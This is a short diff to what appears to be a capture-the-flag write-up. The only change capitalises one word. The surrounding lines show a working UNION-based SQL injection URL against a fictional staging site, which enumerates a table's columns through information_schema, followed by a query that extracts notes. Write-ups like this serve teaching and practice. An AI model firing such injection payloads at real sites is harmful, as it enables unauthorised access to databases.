@@ -80,7 +80,7 @@ This can be rewritten for the SQLi as follows:
 ```
 https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select column_name from information_schema.columns where table_name="todo")d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 ```
-we can see, that this table consists out of 3 columns: `id`, `note`, `completed`.
+We can see, that this table consists out of 3 columns: `id`, `note`, `completed`.
 The `note` column can then be extracted using
 ```
 select note from todo;
